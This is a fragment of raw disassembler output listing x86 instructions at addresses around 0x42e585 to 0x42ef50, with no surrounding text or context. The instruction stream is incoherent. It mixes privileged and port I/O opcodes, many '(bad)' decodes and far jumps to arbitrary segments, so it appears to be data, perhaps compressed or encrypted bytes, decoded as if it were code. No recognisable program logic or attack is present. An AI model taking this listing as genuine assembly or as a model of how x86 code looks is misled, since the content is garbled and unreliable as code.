  42e585:	arpl   WORD PTR [edi],sp
  42e587:	mov    dh,0xe3
  42e589:	cwde   
  42e58a:	outs   dx,BYTE PTR ds:[esi]
  42e58b:	adc    eax,0x30bcb615
  42e590:	cmp    eax,DWORD PTR [eax]
	...
  42e5f2:	add    BYTE PTR [eax],al
  42e5f4:	push   ebp
  42e5f5:	cmp    dh,cl
  42e5f7:	adc    bh,ch
  42e5f9:	neg    bh
  42e5fb:	jge    0x42e58f
  42e5fd:	xchg   ebp,eax
  42e5fe:	jns    0x42e631
  42e600:	in     eax,dx
  42e601:	jae    0x42e682
  42e603:	pop    ds
  42e604:	pop    esi
  42e605:	icebp  
  42e606:	add    DWORD PTR [eax],eax
  42e608:	add    eax,0x14000001
  42e60d:	dec    edx
  42e60e:	sub    eax,0xddeeb3e7
  42e613:	or     eax,0x469ac8f1
  42e618:	outs   dx,BYTE PTR ds:[esi]
  42e619:	cmp    ecx,DWORD PTR [edx-0x761b1c67]
  42e61f:	sar    ch,cl
  42e621:	nop
  42e622:	adc    eax,0x387cd0d8
  42e627:	adc    BYTE PTR [eax+0x5e13e544],0xc
  42e62e:	or     al,bh
  42e630:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e631:	pushf  
  42e632:	xchg   edi,eax
  42e633:	sub    eax,0x92e152ed
  42e638:	or     BYTE PTR [edx+esi*4+0x2f],dh
  42e63c:	push   es
  42e63d:	jae    0x42e6a0
  42e63f:	in     al,0x9e
  42e641:	retf   
  42e642:	imul   ebp,DWORD PTR [ebp-0x52],0x4f
  42e646:	xor    DWORD PTR [ecx],ecx
  42e648:	add    eax,0xf0d09417
  42e64d:	rcr    DWORD PTR [esi],cl
  42e64f:	stos   BYTE PTR es:[edi],al
  42e650:	int    0x80
  42e652:	ja     0x42e60b
  42e654:	mov    cl,0x88
  42e656:	mov    edi,DWORD PTR [eax]
  42e658:	fidivr DWORD PTR fs:[ebx-0x37]
  42e65c:	dec    esp
  42e65d:	outs   dx,DWORD PTR ds:[esi]
  42e65e:	add    eax,0x4f943d0a
  42e663:	xchg   DWORD PTR [ecx+ecx*4+0x10cbd864],esp
  42e66a:	ss and al,0xb3
  42e66d:	mov    ecx,0x3db7e427
  42e672:	inc    ebx
  42e673:	xchg   edx,eax
  42e674:	dec    ebp
  42e675:	xlat   BYTE PTR ds:[ebx]
  42e676:	xlat   BYTE PTR cs:[ebx]
  42e678:	outs   dx,DWORD PTR ds:[esi]
  42e679:	iret   
  42e67a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e67b:	pushw  es
  42e67d:	xor    cl,cl
  42e67f:	mov    al,ds:0xa804152e
  42e684:	pop    ebp
  42e685:	sbb    bl,bh
  42e687:	xchg   esi,eax
  42e688:	mov    bh,0x82
  42e68a:	stc    
  42e68b:	push   es
  42e68c:	jae    0x42e63f
  42e68e:	mov    ecx,cr4
  42e691:	and    ch,dl
  42e693:	mov    dl,0xbf
  42e695:	pop    ebx
  42e696:	popf   
  42e697:	cwde   
  42e698:	adc    DWORD PTR [esi+0x6dab0a88],0x36
  42e69f:	mov    ss,edx
  42e6a1:	dec    ebx
  42e6a2:	(bad)  
  42e6a3:	dec    ebp
  42e6a4:	sbb    ebp,ebp
  42e6a6:	cmp    DWORD PTR [edx+0xf729dd6],ebp
  42e6ac:	cmp    BYTE PTR [ebp-0x78],al
  42e6af:	xchg   ebx,eax
  42e6b0:	and    edi,DWORD PTR [esi-0x5d98c836]
  42e6b6:	stc    
  42e6b7:	sbb    eax,0x9bb50d9f
  42e6bc:	lea    eax,[esi-0x27bf223]
  42e6c2:	inc    eax
  42e6c3:	out    dx,al
  42e6c4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e6c5:	test   eax,0x9fc06600
  42e6ca:	int    0x8e
  42e6cc:	outs   dx,DWORD PTR ds:[esi]
  42e6cd:	and    al,0x57
  42e6cf:	xchg   esp,eax
  42e6d0:	sbb    eax,0xdd8d682d
  42e6d5:	xchg   DWORD PTR [edx+eax*1],eax
  42e6d8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e6d9:	mov    ebp,0x94a7264c
  42e6de:	imul   edx,DWORD PTR [ebx],0x771416ce
  42e6e4:	and    DWORD PTR [eax],ecx
  42e6e6:	push   0xffffffad
  42e6e8:	adc    BYTE PTR [esi],0xd2
  42e6eb:	xlat   BYTE PTR ds:[ebx]
  42e6ec:	xor    BYTE PTR [ebx+0x2f2ca07f],bh
  42e6f2:	push   edx
  42e6f3:	pop    eax
  42e6f4:	icebp  
  42e6f5:	jbe    0x42e763
  42e6f7:	mov    al,ds:0x803f9868
  42e6fc:	sbb    DWORD PTR [eax],0x3540a321
  42e702:	and    al,0xb9
  42e704:	je     0x42e68b
  42e706:	in     eax,0xe3
  42e708:	into   
  42e709:	xchg   esi,eax
  42e70a:	jb     0x42e69b
  42e70c:	out    dx,al
  42e70d:	add    DWORD PTR [esi+0x29],0xcc
	...
  42e774:	pop    edx
  42e775:	cmp    DWORD PTR [esi+0x2d],ecx
  42e778:	outs   dx,DWORD PTR ds:[esi]
  42e779:	jg     0x42e7f6
  42e77b:	jg     0x42e7e1
  42e77d:	sub    BYTE PTR [esi],cl
  42e77f:	fcmovbe st,st(4)
  42e781:	pop    edx
  42e782:	xchg   edx,eax
  42e783:	mov    WORD PTR [ebx-0xe],fs
  42e786:	add    DWORD PTR [eax],eax
  42e788:	add    eax,0x38000001
  42e78d:	int    0x44
  42e78f:	add    dh,BYTE PTR [edi+edx*2+0x63]
  42e793:	stos   BYTE PTR es:[edi],al
  42e794:	and    dl,BYTE PTR ds:0x8bda3c88
  42e79a:	push   esp
  42e79b:	out    0xd2,eax
  42e79d:	add    al,0x1f
  42e79f:	dec    edx
  42e7a0:	scas   al,BYTE PTR es:[edi]
  42e7a1:	and    al,0x1b
  42e7a3:	call   0x510b:0xd85b01a
  42e7aa:	xchg   BYTE PTR [edi+0x6f84a0a2],al
  42e7b0:	out    0x11,al
  42e7b2:	cmp    al,ah
  42e7b4:	jb     0x42e789
  42e7b6:	add    eax,0x143a9acd
  42e7bb:	pop    es
  42e7bc:	xchg   edx,eax
  42e7bd:	push   ss
  42e7be:	das    
  42e7bf:	jmp    0xab64:0xf476ada
  42e7c6:	enter  0xf7b,0xf
  42e7ca:	and    ebx,ebp
  42e7cc:	loop   0x42e840
  42e7ce:	push   esp
  42e7cf:	repnz pusha 
  42e7d1:	jnp    0x42e834
  42e7d3:	xchg   edx,eax
  42e7d4:	les    ecx,FWORD PTR [ecx]
  42e7d6:	fbld   TBYTE PTR [edx+0x7e]
  42e7d9:	rcr    dl,0xb5
  42e7dc:	(bad)  
  42e7dd:	loope  0x42e793
  42e7df:	pop    esi
  42e7e0:	xor    BYTE PTR [esi+0x61],0x7c
  42e7e4:	dec    ebx
  42e7e5:	mov    ch,0xec
  42e7e7:	sbb    esi,0x7b80b61c
  42e7ed:	adc    dh,BYTE PTR [ecx+0x2cdc7a14]
  42e7f3:	push   esi
  42e7f4:	ins    DWORD PTR es:[edi],dx
  42e7f5:	jp     0x42e869
  42e7f7:	jp     0x42e7af
  42e7f9:	push   ds
  42e7fa:	jle    0x42e81e
  42e7fc:	sbb    BYTE PTR [esi+esi*8-0xc699a95],0x21
  42e804:	cmp    ecx,ecx
  42e806:	pop    es
  42e807:	dec    esp
  42e808:	mov    al,0x3
  42e80a:	mov    ebx,0x106cf9cf
  42e80f:	mov    eax,ds:0x38cbd74d
  42e814:	xchg   ecx,eax
  42e815:	sbb    eax,0x35e8a958
  42e81a:	push   0x14
  42e81c:	dec    ebp
  42e81d:	mov    al,0x41
  42e81f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e820:	push   ds
  42e821:	adc    esp,0x62b03f0c
  42e827:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e828:	mov    ebx,0xccb9a6c8
  42e82d:	cmc    
  42e82e:	ja     0x42e844
  42e830:	xor    al,0xb9
  42e832:	pmaxsw mm3,mm7
  42e835:	ret    
  42e836:	arpl   sp,di
  42e838:	push   cs
  42e839:	test   edx,eax
  42e83b:	sub    esp,DWORD PTR [edx+0x3ab369c1]
  42e841:	jge    0x42e7da
  42e843:	pop    edx
  42e844:	loop   0x42e853
  42e846:	rol    BYTE PTR [edx],0xc6
  42e849:	push   es
  42e84a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e84b:	out    0x3d,al
  42e84d:	cmp    dl,BYTE PTR [eax]
  42e84f:	je     0x42e879
  42e851:	les    edi,FWORD PTR [ebx+0x29]
  42e854:	out    0xb5,eax
  42e856:	outs   dx,DWORD PTR ds:[esi]
  42e857:	xor    BYTE PTR [ecx],0x84
  42e85a:	add    dh,BYTE PTR [esi-0x23]
  42e85d:	mov    bh,0xe0
  42e85f:	lds    ebp,FWORD PTR [esi+0x738d5526]
  42e865:	jne    0x42e839
  42e867:	sahf   
  42e868:	inc    eax
  42e869:	and    cl,dh
  42e86b:	push   edi
  42e86c:	jecxz  0x42e8b7
  42e86e:	(bad)  
  42e86f:	pop    ds
  42e870:	pop    esp
  42e871:	xchg   BYTE PTR [edx+0x1665207a],al
  42e877:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e878:	and    eax,0x87854e60
  42e87d:	lock xor ch,al
  42e880:	retf   
  42e881:	pop    ss
  42e882:	cld    
  42e883:	mov    eax,ds:0x86fbce5d
  42e888:	jmp    0x42c0:0xf0ece99e
  42e88f:	cdq    
  42e890:	add    DWORD PTR [eax],eax
	...
  42e8f2:	add    BYTE PTR [eax],al
  42e8f4:	ret    
  42e8f5:	ja     0x42e957
  42e8f7:	and    al,0xf4
  42e8f9:	aaa    
  42e8fa:	(bad)  
  42e8fb:	div    DWORD PTR [ecx+0x723f82b]
  42e901:	jp     0x42e8ac
  42e903:	pushw  0x1f3
  42e907:	add    BYTE PTR ds:0xe9000001,al
  42e90d:	mov    eax,0xe53c2201
  42e912:	js     0x42e930
  42e914:	jge    0x42e90a
  42e916:	cmp    eax,0xbcbea7dc
  42e91b:	imul   DWORD PTR [esi+0x1ad4ae17]
  42e921:	das    
  42e922:	jno    0x42e91e
  42e924:	push   0x39
  42e926:	jae    0x42e981
  42e928:	jne    0x42e8ba
  42e92a:	inc    edx
  42e92b:	push   ss
  42e92c:	popf   
  42e92d:	test   BYTE PTR [edx],bl
  42e92f:	out    dx,eax
  42e930:	pop    es
  42e931:	repz or dh,BYTE PTR [ebx+0x4a]
  42e935:	sbb    esp,DWORD PTR [eax-0x29]
  42e938:	cmp    edx,DWORD PTR [eax]
  42e93a:	dec    edi
  42e93b:	dec    esi
  42e93c:	pusha  
  42e93d:	icebp  
  42e93e:	adc    eax,0xfc601d02
  42e943:	mov    ch,0x35
  42e945:	loope  0x42e968
  42e947:	push   edi
  42e948:	data16 sti 
  42e94a:	push   es
  42e94b:	sub    al,bh
  42e94d:	sub    DWORD PTR [ebp+0x27],0xffffffde
  42e951:	repnz jecxz 0x42e9c0
  42e954:	jle    0x42e995
  42e956:	mov    eax,0x53176aa4
  42e95b:	fst    DWORD PTR ds:[esi+ebx*4]
  42e95f:	ds test al,0x13
  42e962:	push   ds
  42e963:	test   BYTE PTR [edi],bl
  42e965:	(bad)  
  42e966:	fistp  DWORD PTR [esp+ebp*8-0x419e8495]
  42e96d:	out    dx,al
  42e96e:	mov    eax,0xbc5f0f7d
  42e973:	icebp  
  42e974:	inc    ecx
  42e975:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e976:	mov    bh,0x5c
  42e978:	inc    esp
  42e979:	xchg   ecx,eax
  42e97a:	sti    
  42e97b:	mov    edx,0x27937a94
  42e980:	add    al,0x33
  42e982:	ins    BYTE PTR es:[edi],dx
  42e983:	js     0x42e916
  42e985:	popa   
  42e986:	les    ebx,FWORD PTR [edx]
  42e988:	mov    fs,ebx
  42e98a:	cmp    ch,BYTE PTR [ebp-0x6b]
  42e98d:	jmp    0xd59fe774
  42e992:	pop    ebp
  42e993:	loope  0x42e923
  42e995:	aas    
  42e996:	jmp    0x63f3d720
  42e99b:	sahf   
  42e99c:	xor    eax,DWORD PTR [ecx+0x770028dc]
  42e9a2:	sub    BYTE PTR [ecx-0x53],bl
  42e9a5:	jmp    0xaaca:0xbfe3dad8
  42e9ac:	cmp    dh,BYTE PTR [ecx+0xc84610d]
  42e9b2:	add    cl,BYTE PTR ds:0xe8cb6e48
  42e9b8:	js     0x42e9d2
  42e9ba:	sahf   
  42e9bb:	or     DWORD PTR [edx],ebp
  42e9bd:	add    bh,dl
  42e9bf:	stos   DWORD PTR es:[edi],eax
  42e9c0:	repnz scas al,BYTE PTR es:[edi]
  42e9c2:	iret   
  42e9c3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e9c4:	inc    esp
  42e9c5:	loopne 0x42e9ed
  42e9c7:	(bad)  
  42e9c8:	mov    ch,0xcc
  42e9ca:	popa   
  42e9cb:	lock xchg BYTE PTR [edx],cl
  42e9ce:	stos   DWORD PTR es:[edi],eax
  42e9cf:	add    esp,ebp
  42e9d1:	loopne 0x42e958
  42e9d3:	pushf  
  42e9d4:	adc    esi,esi
  42e9d6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e9d7:	xor    esi,DWORD PTR [esi+0x25]
  42e9da:	cmp    al,0x7e
  42e9dc:	jecxz  0x42ea3a
  42e9de:	shr    DWORD PTR [edi],0x38
  42e9e1:	cli    
  42e9e2:	push   esp
  42e9e3:	out    0xb5,eax
  42e9e5:	ins    BYTE PTR es:[edi],dx
  42e9e6:	xchg   esp,eax
  42e9e7:	mov    bl,0x42
  42e9e9:	ror    BYTE PTR ds:0x5fbb5d7,1
  42e9ef:	push   cs
  42e9f0:	mov    cl,0xc4
  42e9f2:	fdivr  DWORD PTR [eax+edi*2]
  42e9f6:	xchg   esi,eax
  42e9f7:	sahf   
  42e9f8:	mov    al,ds:0xd5f40ecd
  42e9fd:	cdq    
  42e9fe:	(bad)  
  42ea00:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ea01:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42ea02:	repz iret 
  42ea04:	jno    0x42ea47
  42ea06:	scas   eax,DWORD PTR es:[edi]
  42ea07:	xor    al,0x2e
  42ea09:	add    edx,esi
  42ea0b:	add    eax,0xcf22d667
  42ea10:	add    BYTE PTR fs:[eax],al
	...
  42ea73:	add    ch,ah
  42ea75:	mov    edx,0xebdfe392
  42ea7a:	cmc    
  42ea7b:	mov    esi,0x66dc160c
  42ea80:	scas   al,BYTE PTR es:[edi]
  42ea81:	mov    ebx,0xf46d0901
  42ea86:	add    DWORD PTR [eax],eax
  42ea88:	add    eax,0x52000001
  42ea8d:	adc    esi,DWORD PTR [ebp+0x559cfa9b]
  42ea93:	aaa    
  42ea94:	cwde   
  42ea95:	mov    al,0x79
  42ea97:	xchg   ebx,eax
  42ea98:	sbb    al,0xc8
  42ea9a:	jmp    0xba01:0x2b9e6991
  42eaa1:	stos   BYTE PTR es:[edi],al
  42eaa2:	rcl    dh,cl
  42eaa4:	xor    dl,BYTE PTR [ebx+0x50e49d45]
  42eaaa:	bound  ebx,QWORD PTR [ecx+0x76]
  42eaad:	das    
  42eaae:	shl    BYTE PTR [ecx+0x3b],cl
  42eab1:	cwde   
  42eab2:	fisubr WORD PTR [ecx+ebp*2]
  42eab5:	(bad)  
  42eab7:	mov    bh,0x8b
  42eab9:	mov    esp,0x6b2421f1
  42eabe:	fimul  WORD PTR [eax+0x4be8b08d]
  42eac4:	lods   al,BYTE PTR ds:[esi]
  42eac5:	push   0xffffffe3
  42eac7:	out    0xa,eax
  42eac9:	clc    
  42eaca:	out    dx,al
  42eacb:	pop    eax
  42eacc:	jo     0x42eab7
  42eace:	mov    eax,ds:0xefcee5f4
  42ead3:	stos   DWORD PTR es:[edi],eax
  42ead4:	adc    eax,DWORD PTR [edx-0x59]
  42ead7:	push   esp
  42ead8:	pop    eax
  42ead9:	pop    esp
  42eada:	stc    
  42eadb:	xlat   BYTE PTR ds:[ebx]
  42eadc:	pop    ebx
  42eadd:	sub    al,0x6b
  42eadf:	in     al,0x99
  42eae1:	jmp    0x9506:0x62607440
  42eae8:	and    eax,0x3302a026
  42eaed:	sahf   
  42eaee:	ret    
  42eaef:	mov    cl,0x44
  42eaf1:	pop    edx
  42eaf2:	jle    0x42eb57
  42eaf4:	xchg   ebx,eax
  42eaf5:	mov    edx,0x40c550aa
  42eafa:	mov    ch,0x3e
  42eafc:	pop    edi
  42eafd:	xor    DWORD PTR [ecx],ecx
  42eaff:	xor    ah,BYTE PTR [ebp-0xefd904b]
  42eb05:	mov    ds:0xe546c587,al
  42eb0a:	jmp    0x633f:0xf573d41a
  42eb11:	adc    ebx,DWORD PTR [ebx+0x29]
  42eb14:	sbb    eax,0xed385c9d
  42eb19:	cmc    
  42eb1a:	jmp    0x42eaac
  42eb1c:	or     dh,BYTE PTR [ecx+0x605c1fe7]
  42eb22:	fwait
  42eb23:	xlat   BYTE PTR ds:[ebx]
  42eb24:	das    
  42eb25:	push   0x10b5b9d
  42eb2a:	pop    ebp
  42eb2b:	fnstsw WORD PTR [ecx-0x3e7ee0e7]
  42eb31:	xor    BYTE PTR [edi-0x6d],0x75
  42eb35:	or     DWORD PTR [ecx+0x57],ecx
  42eb38:	ins    BYTE PTR es:[edi],dx
  42eb39:	dec    ebx
  42eb3a:	xchg   DWORD PTR [ecx-0x44],esi
  42eb3d:	test   eax,0xa3783829
  42eb42:	xchg   DWORD PTR ds:0x50822335,edi
  42eb48:	pop    es
  42eb49:	(bad)  
  42eb4a:	enter  0xf8c7,0xc3
  42eb4e:	aas    
  42eb4f:	cmp    BYTE PTR [ebx],al
  42eb51:	cmp    BYTE PTR [edi+0x6d],0x6a
  42eb55:	jbe    0x42ebd3
  42eb57:	ret    
  42eb58:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42eb59:	cs lahf 
  42eb5b:	jo     0x42eaf7
  42eb5d:	mov    ecx,0xe00a7507
  42eb62:	inc    ebx
  42eb63:	jg     0x42eb56
  42eb65:	inc    ecx
  42eb66:	dec    eax
  42eb67:	mov    dl,0xa6
  42eb69:	ja     0x42ebaa
  42eb6b:	jmp    0xdcee412
  42eb70:	das    
  42eb71:	adc    BYTE PTR [ebx-0x1e],ah
  42eb74:	and    eax,0x9e31d8d5
  42eb79:	push   ecx
  42eb7a:	add    eax,0x772decba
  42eb7f:	and    al,0x48
  42eb81:	mov    eax,0x23dd2926
  42eb86:	ret    
  42eb87:	out    0x15,al
  42eb89:	jg     0x42ebd5
  42eb8b:	mov    ch,0x5a
  42eb8d:	push   ss
  42eb8e:	ins    DWORD PTR es:[edi],dx
  42eb8f:	fimul  DWORD PTR [ebx+0x0]
	...
  42ebf2:	add    BYTE PTR [eax],al
  42ebf4:	jle    0x42ec37
  42ebf6:	jne    0xfc41bb3b
  42ebfc:	pusha  
  42ebfd:	popf   
  42ebfe:	pop    ecx
  42ebff:	cmp    DWORD PTR [edi],0x72d20d44
  42ec05:	cmc    
  42ec06:	add    DWORD PTR [eax],eax
  42ec08:	add    eax,0xdb000001
  42ec0d:	in     eax,dx
  42ec0e:	and    edi,ecx
  42ec10:	mov    ebx,0x1f0bd4d1
  42ec15:	xchg   esi,eax
  42ec16:	test   BYTE PTR [edi-0x4a],al
  42ec19:	fwait
  42ec1a:	and    cl,bh
  42ec1c:	pop    edx
  42ec1d:	std    
  42ec1e:	mov    ds:0x85d5f261,eax
  42ec23:	jmp    0xd07ad513
  42ec28:	push   ss
  42ec29:	mov    DWORD PTR [ecx+0x44],esp
  42ec2c:	xchg   ecx,eax
  42ec2d:	loope  0x42ebb8
  42ec2f:	push   ecx
  42ec30:	xor    DWORD PTR [edx-0x62eb3cd3],ebx
  42ec36:	jmp    0x457a493c
  42ec3b:	sbb    DWORD PTR [eax-0x6c],0xffffffcc
  42ec3f:	inc    eax
  42ec40:	pop    ds
  42ec41:	out    0x67,al
  42ec43:	mov    esi,0x1aa32a14
  42ec48:	or     cl,BYTE PTR [ebx-0x6ee72084]
  42ec4e:	adc    eax,0x57e512d6
  42ec53:	sbb    DWORD PTR [edi-0xa],ebp
  42ec56:	sub    cl,dh
  42ec58:	add    eax,0x3e20a696
  42ec5d:	stos   DWORD PTR es:[edi],eax
  42ec5e:	mov    bl,0x4b
  42ec60:	cmp    DWORD PTR [esi-0x59],eax
  42ec63:	jne    0x42ece3
  42ec65:	dec    edi
  42ec66:	pop    edi
  42ec67:	dec    esi
  42ec68:	(bad)
  42ec6c:	sub    al,0x39
  42ec6e:	cmp    cl,BYTE PTR [edx]
  42ec70:	add    ebx,ecx
  42ec72:	lods   al,BYTE PTR ds:[esi]
  42ec73:	mov    dh,0x97
  42ec75:	jae    0x42ecb8
  42ec77:	fld    QWORD PTR [ecx]
  42ec79:	pop    ss
  42ec7a:	sar    BYTE PTR [edx+edx*1+0x22de5b49],1
  42ec81:	call   0x67810189
  42ec86:	xor    al,0xdc
  42ec88:	or     al,0xf6
  42ec8a:	dec    edi
  42ec8b:	cmc    
  42ec8c:	jecxz  0x42ec7d
  42ec8e:	jl     0x42ecc0
  42ec90:	popa   
  42ec91:	inc    ebp
  42ec92:	out    dx,eax
  42ec93:	sti    
  42ec94:	dec    eax
  42ec95:	mov    eax,ebp
  42ec97:	xor    al,0x78
  42ec99:	mov    edx,DWORD PTR [edi]
  42ec9b:	push   0x842a48ec
  42eca0:	imul   edi,DWORD PTR [eax+0x1f20dff1],0xfab584b4
  42ecaa:	loopne 0x42ecdd
  42ecac:	shl    DWORD PTR [eax],cl
  42ecae:	jne    0x42ed13
  42ecb0:	daa    
  42ecb1:	ins    BYTE PTR es:[edi],dx
  42ecb2:	push   edi
  42ecb3:	fisub  DWORD PTR [edx]
  42ecb5:	push   ebp
  42ecb6:	xchg   BYTE PTR [ecx],bh
  42ecb8:	adc    DWORD PTR [edi-0x5af5847a],edi
  42ecbe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ecbf:	popf   
  42ecc0:	retf   
  42ecc1:	lods   eax,DWORD PTR ds:[esi]
  42ecc2:	mov    ss,WORD PTR es:[edi+0x354fbf2]
  42ecc9:	fsub   DWORD PTR [esp]
  42eccc:	ja     0x42ecc0
  42ecce:	repnz add eax,0x8aa83403
  42ecd4:	out    dx,eax
  42ecd5:	into   
  42ecd6:	leave  
  42ecd7:	test   cl,ah
  42ecd9:	add    al,0x7e
  42ecdb:	ret    0x80af
  42ecde:	stos   BYTE PTR es:[edi],al
  42ecdf:	mul    DWORD PTR ds:0xf985c668
  42ece5:	mov    esp,DWORD PTR [ecx-0x7b]
  42ece8:	lds    edi,FWORD PTR [eax+0xf]
  42eceb:	fadd   QWORD PTR [edx-0x7479ec44]
  42ecf1:	test   al,0xd1
  42ecf3:	xchg   edi,eax
  42ecf4:	scas   eax,DWORD PTR es:[edi]
  42ecf5:	ins    BYTE PTR es:[edi],dx
  42ecf6:	js     0x42ec9c
  42ecf8:	test   al,0xba
  42ecfa:	mov    ecx,0x15c732e0
  42ecff:	push   ebp
  42ed00:	or     al,0x44
  42ed02:	xchg   DWORD PTR [bp+si],esp
  42ed05:	cld    
  42ed06:	inc    ebx
  42ed07:	pop    edx
  42ed08:	jmp    0xa47613ce
  42ed0d:	aad    0x64
  42ed0f:	outs   dx,DWORD PTR ds:[esi]
  42ed10:	adc    al,0x0
	...
  42ed72:	add    BYTE PTR [eax],al
  42ed74:	sub    dh,dh
  42ed76:	scas   eax,DWORD PTR es:[edi]
  42ed77:	fdivr  st,st(7)
  42ed79:	fnstcw WORD PTR [edi-0xa]
  42ed7c:	jecxz  0x42edb0
  42ed7e:	test   DWORD PTR [edx-0x7bd79544],esp
  42ed84:	ja     0x42ed7c
  42ed86:	add    DWORD PTR [eax],eax
  42ed88:	add    eax,0xf6000001
  42ed8d:	cmp    DWORD PTR [eax],edx
  42ed8f:	dec    esi
  42ed90:	outs   dx,DWORD PTR ds:[esi]
  42ed91:	or     al,0xb1
  42ed93:	sub    DWORD PTR [esi+0x1d],esi
  42ed96:	inc    ecx
  42ed97:	mov    DWORD PTR [ebp+0x6e],esp
  42ed9a:	mul    DWORD PTR [edi]
  42ed9c:	popa   
  42ed9d:	jmp    0x42edae
  42ed9f:	mov    ebp,0x4a703686
  42eda4:	push   cs
  42eda5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42eda6:	xchg   esp,eax
  42eda7:	mov    al,ds:0xa3674624
  42edac:	mov    ecx,0xd9dfff22
  42edb1:	mov    edx,0x115ce221
  42edb6:	ja     0x42ed50
  42edb8:	lea    eax,[edx]
  42edba:	aas    
  42edbb:	push   0x7e
  42edbd:	push   eax
  42edbe:	inc    esi
  42edbf:	jmp    0x8708:0x827a0339
  42edc6:	pop    edx
  42edc7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42edc8:	stos   BYTE PTR es:[edi],al
  42edc9:	cdq    
  42edca:	imul   esi,DWORD PTR ds:0xca66451a,0x3a15fab2
  42edd4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42edd5:	ins    DWORD PTR es:[edi],dx
  42edd6:	imul   eax,DWORD PTR [eax-0x785926e2],0xbc2d5cc1
  42ede0:	inc    ebp
  42ede1:	mov    ebp,0x3f884916
  42ede6:	in     al,dx
  42ede7:	dec    esi
  42ede8:	stos   DWORD PTR es:[edi],eax
  42ede9:	jge    0x42ee44
  42edeb:	sbb    eax,0xffb9ba8b
  42edf0:	xor    al,ah
  42edf2:	aas    
  42edf3:	pop    esi
  42edf4:	lods   eax,DWORD PTR ds:[esi]
  42edf5:	or     DWORD PTR [edx+0x10c92391],ebp
  42edfb:	jmp    0x33bc3d74
  42ee00:	mov    bh,0x9d
  42ee02:	pop    ecx
  42ee03:	mov    DWORD PTR [edi],edx
  42ee05:	pop    es
  42ee06:	cmp    eax,0x89f7f99c
  42ee0b:	mov    ebx,0xa963b701
  42ee10:	out    0xbe,eax
  42ee12:	xor    edx,ebp
  42ee14:	fstp   TBYTE PTR [ecx+0x43058915]
  42ee1a:	push   ds
  42ee1b:	add    al,0xe1
  42ee1d:	push   esi
  42ee1e:	inc    ebx
  42ee1f:	add    eax,0x5bd6a54
  42ee24:	xchg   esi,eax
  42ee25:	(bad)  
  42ee26:	adc    al,0x9f
  42ee28:	jbe    0x42ee7d
  42ee2a:	test   eax,0xea473272
  42ee2f:	into   
  42ee30:	jnp    0x42ee66
  42ee32:	sub    DWORD PTR [ebx],eax
  42ee34:	jl     0x42ee80
  42ee36:	lock pop ebp
  42ee38:	stc    
  42ee39:	sub    DWORD PTR [edi],edx
  42ee3b:	jb     0x42eebb
  42ee3d:	pop    ebp
  42ee3e:	jmp    0xeb43fb81
  42ee43:	mov    ch,0x4c
  42ee45:	lods   al,BYTE PTR ds:[esi]
  42ee46:	(bad)  
  42ee47:	out    0xc2,al
  42ee49:	pop    es
  42ee4a:	fstp   DWORD PTR [ecx+0x30]
  42ee4d:	jb     0x42ee39
  42ee4f:	daa    
  42ee50:	dec    ebp
  42ee51:	out    0xc2,eax
  42ee53:	stos   DWORD PTR es:[edi],eax
  42ee54:	xor    ebp,0xcc5db499
  42ee5a:	jno    0x42ee44
  42ee5c:	aaa    
  42ee5d:	(bad)  
  42ee5e:	test   DWORD PTR [ebp-0x22c00ecb],eax
  42ee64:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ee65:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42ee66:	xor    BYTE PTR [edi+0x4232461e],al
  42ee6c:	pop    ss
  42ee6d:	bound  esp,QWORD PTR [ecx-0x25]
  42ee70:	jmp    0x42ee40
  42ee72:	xor    bl,BYTE PTR [ecx]
  42ee74:	inc    edx
  42ee75:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ee76:	out    0x94,al
  42ee78:	test   eax,0xb5dd1537
  42ee7d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ee7e:	(bad)  
  42ee80:	fcom   QWORD PTR es:0x539d5d92
  42ee87:	cmp    al,0x7
  42ee89:	fadd   st,st(5)
  42ee8b:	jle    0x42ee5e
  42ee8d:	fimul  DWORD PTR [eax]
  42ee8f:	ror    ebp,cl
	...
  42eef1:	add    BYTE PTR [eax],al
  42eef3:	add    bl,al
  42eef5:	add    cl,BYTE PTR [eax]
  42eef7:	xor    eax,0xf6ff3fc9
  42eefc:	jb     0x42ef3a
  42eefe:	jae    0x42ef25
  42ef00:	jg     0x42ee8b
  42ef02:	sbb    DWORD PTR [ecx+0x1f77c],0x105
  42ef0c:	fisub  WORD PTR [edx+eax*2+0x46]
  42ef10:	outs   dx,DWORD PTR ds:[esi]
  42ef11:	jae    0x42eea5
  42ef13:	(bad)  
  42ef14:	or     esi,DWORD PTR [ebx-0x49478111]
  42ef1a:	inc    edx
  42ef1b:	sub    edx,eax
  42ef1d:	add    eax,esp
  42ef1f:	adc    DWORD PTR [eax-0x5d917d35],0xffffff83
  42ef26:	gs rol esi,0x7b
  42ef2a:	stc    
  42ef2b:	sbb    DWORD PTR [eax-0x27],ecx
  42ef2e:	pop    esi
  42ef2f:	mov    ebp,0x73f6eb03
  42ef34:	push   0xffffff98
  42ef36:	push   0xffffffde
  42ef38:	je     0x42ef6c
  42ef3a:	fadd   DWORD PTR [ecx*1+0x4a3ff8cf]
  42ef41:	mov    ds,edx
  42ef43:	test   al,0x5a
  42ef45:	cmc    
  42ef46:	dec    eax
  42ef47:	cmp    DWORD PTR [ebx+0x61beb28],0xffffffea
  42ef4e:	mov    bl,0x77
  42ef50:	cdq    
